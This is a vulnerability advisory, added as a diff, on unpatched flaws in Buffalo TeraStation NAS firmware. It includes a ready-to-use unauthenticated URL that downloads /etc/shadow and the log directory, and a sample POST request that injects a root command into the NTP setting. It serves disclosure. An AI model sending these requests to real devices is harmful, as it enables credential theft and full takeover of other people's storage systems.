@@ -1,0 +1,55 @@
+**************************************************************
+Title: Buffalo TeraStation TS-Series multiple vulnerabilities
+Version affected: firmware version <= 1.5.7
+Vendor: http://www.buffalotech.com/products/network-storage
+Discovered by: Andrea Fabrizi
+Email: andrea.fabrizi () gmail com
+Web: http://www.andreafabrizi.it
+Twitter: @andreaf83
+Status: unpatched
+**************************************************************
+
+Buffalo's TeraStation network attached storage (NAS) solutions offer
+centralized storage and backup for home, small office and business
+needs.
+
+The firmware is based on Linux ARM and most of the internal software
+is written using Perl.
+
+The vulnerabilities that I found allows any unauthenticated attacker
+to access arbitrary files on the NAS filesystem and execute system
+commands with root privileges.
+
+Tested successfully on TS-XL, TS-RXL, TS-WXL, TS-HTGL/R5, TS-XEL with
+the latest firmware installed (v1.57). Surely other versions with the
+same firmware are vulnerable.
+
+1]======== sync.cgi unauthenticated arbitrary file download ========
+Requesting an unprotected cgi, it's possible, for an unauthenticated
+user, to download any system file, included /etc/shadow, that contains
+the password shadows for the application/system users.
+
+/cgi-bin/sync.cgi?gSSS=foo&gRRR=foo&gPage=information&gMode=log&gType=save&gKey=/etc/shadow
+
+Moreover, using the key "all" it's possible to download the entire
+/var/log directory:
+
+/cgi-bin/sync.cgi?gSSS=foo&gRRR=foo&gPage=information&gMode=log&gType=save&gKey=all
+
+2]======== dynamic.pl NTP command injection ========
+This vulnerability allows authenticated users to execute arbitrary
+commands on the system with root privileges.
+
+This is a sample request:
+#####################################
+POST /dynamic.pl HTTP/1.1
+Content-Length: 89
+Cookie: webui_session_admin=xxxxxxxxxxxxxxxxxxxxxx_en_0
+
+bufaction=setDTSettings&dateMethod=on
+&ip=www.google.it%26%26[COMMAND]>/tmp/output
+&syncFreq=1d
+#####################################
+
+It's possible to view the command output using the previous
+vulnerability (reading the /tmp/output file).
